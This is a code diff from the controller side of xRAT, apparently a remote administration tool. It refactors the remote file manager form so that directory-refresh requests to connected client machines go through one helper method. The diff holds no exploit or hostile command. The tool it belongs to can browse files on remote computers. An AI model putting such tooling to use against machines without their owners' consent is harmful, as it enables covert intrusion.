@@ -65,8 +65,7 @@ namespace xServer.Forms
                     if (_connectClient.Value.LastDirectorySeen)
                     {
                         _currentDir = cmbDrives.SelectedValue.ToString();
-                        new Core.Packets.ServerPackets.GetDirectory(_currentDir).Execute(_connectClient);
-                        _connectClient.Value.LastDirectorySeen = false;
+                        RefreshDirectory();
                     }
                 }
             }
@@ -92,8 +91,7 @@ namespace xServer.Forms
                         break;
                 }
 
-                new Core.Packets.ServerPackets.GetDirectory(_currentDir).Execute(_connectClient);
-                _connectClient.Value.LastDirectorySeen = false;
+                RefreshDirectory();
             }
         }
 
@@ -209,11 +207,7 @@ namespace xServer.Forms
 
         private void ctxtRefresh_Click(object sender, EventArgs e)
         {
-            if (_connectClient != null)
-            {
-                new Core.Packets.ServerPackets.GetDirectory(_currentDir).Execute(_connectClient);
-                _connectClient.Value.LastDirectorySeen = false;
-            }
+            RefreshDirectory();
         }
 
         private void ctxtOpenDirectory_Click(object sender, EventArgs e)
@@ -358,7 +352,7 @@ namespace xServer.Forms
                         }
 
                         if (remoteDir == _currentDir)
-                            new Core.Packets.ServerPackets.GetDirectory(_currentDir).Execute(_connectClient); // refresh directory
+                            RefreshDirectory();
 
                         UpdateTransferStatus(index, "Completed", 1);
                     }).Start();
@@ -368,10 +362,10 @@ namespace xServer.Forms
 
         private void FrmFileManager_KeyDown(object sender, KeyEventArgs e)
         {
+            // refresh when F5 is pressed
             if (e.KeyCode == Keys.F5 && !string.IsNullOrEmpty(_currentDir) && TabControlFileManager.SelectedIndex == 0)
             {
-                // refresh with F5
-                new Core.Packets.ServerPackets.GetDirectory(_currentDir).Execute(_connectClient);
+                RefreshDirectory();
                 e.Handled = true;
             }
         }
@@ -509,6 +503,13 @@ namespace xServer.Forms
                         "An unexpected error occurred: {0}\n\nPlease report this as fast as possible here:\\https://github.com/MaxXor/xRAT/issues",
                         ex.Message), "", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
+        }
+
+        private void RefreshDirectory()
+        {
+            if (_connectClient == null || _connectClient.Value == null || _connectClient.Value.LastDirectorySeen == false) return;
+            new Core.Packets.ServerPackets.GetDirectory(_currentDir).Execute(_connectClient);
+            _connectClient.Value.LastDirectorySeen = false;
         }
 
         private void lstDirectory_ColumnClick(object sender, ColumnClickEventArgs e)
